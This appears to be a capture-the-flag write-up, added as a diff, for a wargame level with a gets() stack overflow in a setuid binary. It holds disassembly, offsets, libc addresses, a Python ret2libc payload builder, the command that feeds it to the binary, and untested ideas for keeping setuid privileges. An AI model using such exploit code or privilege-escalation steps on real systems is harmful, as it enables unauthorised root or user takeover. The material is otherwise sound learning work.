@@ -1,0 +1,84 @@
+## Level1 - Ret2libc Buffer Overflow Exploit
+
+### Vulnerability Analysis
+- **Binary**: level1 (32-bit ELF, setuid level2)
+- **Vulnerability**: Stack buffer overflow in main() via gets()
+- **Mitigation Bypass**: NX disabled, ASLR off → Ret2libc viable
+
+### Binary Disassembly (main function)
+```
+08048480 <main>:
+ 8048480:  push   %ebp
+ 8048481:  mov    %esp,%ebp
+ 8048483:  and    $0xfffffff0,%esp
+ 8048486:  sub    $0x50,%esp          # Allocate 80 bytes on stack
+ 8048489:  lea    0x10(%esp),%eax     # Buffer at ESP+0x10
+ 804848d:  mov    %eax,(%esp)
+ 8048490:  call   8048340 <gets@plt>  # Vulnerable gets() call
+ 8048495:  leave
+ 8048496:  ret
+```
+
+### Key Findings
+- **Buffer size**: 64 bytes (allocated space minus offset)
+- **Stack offset to return address**: 72 bytes
+- **Necessary gadgets**:
+  - system() → 0xb7e6b060
+  - exit() → 0xb7e5ebe0
+  - /bin/sh → 0xb7f8cc58
+
+### Payload Structure (88 bytes total)
+```
+[72 bytes padding] [4 bytes system()] [4 bytes exit()] [4 bytes ptr to /bin/sh]
+```
+
+### Critical Issue Encountered
+The ret2libc exploit successfully overflows the buffer and calls system(), BUT:
+- /bin/sh drops setuid privileges for security reasons
+- Even though level1 binary is owned by level2 with setuid bit set,
+  the spawned shell runs as level1, preventing access to /home/user/level2/.pass
+
+### Working Code (Python3)
+```python
+import struct
+
+system_addr = 0xb7e6b060
+exit_addr = 0xb7e5ebe0
+binsh_addr = 0xb7f8cc58
+
+payload = b'A' * 72
+payload += struct.pack('<I', system_addr)
+payload += struct.pack('<I', exit_addr)
+payload += struct.pack('<I', binsh_addr)
+
+with open('/tmp/payload.bin', 'wb') as f:
+    f.write(payload)
+```
+
+### Execution
+```bash
+(cat /tmp/payload.bin; echo) | ./level1
+```
+
+### Alternative Approach (TO BE VERIFIED)
+Option 1: Find a binary that doesn't drop setuid privileges
+Option 2: Use ROP chain to call setuid(0) before execve
+Option 3: Create setuid wrapper script in /tmp that executes the cat command
+Option 4: Check if bash instead of sh preserves privileges
+
+### Verification Steps
+1. (yes) Confirmed buffer overflow causes crashes (exit code 139)
+2. (yes) Confirmed ltrace shows buffer at 0xbffffcd0
+3. (yes) Confirmed system() is called (got "permission denied" error)
+4. (no) Confirmed shell drops setuid privileges (still runs as level1)
+
+### Resources
+- [Return-to-libc Attack](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)
+- [GDB Address Discovery](https://github.com/selfsigned/0a836f3d98efc512509cc042b449160a)
+- Rainfall Project GitHub Writeups
+
+### Next Steps
+- Try using bash with -p flag to preserve setuid
+- Try using exec() or execve() instead of system()
+- Try ROP gadget chaining to call setuid() first
+- Check if vulnerability is intended to be solved differently
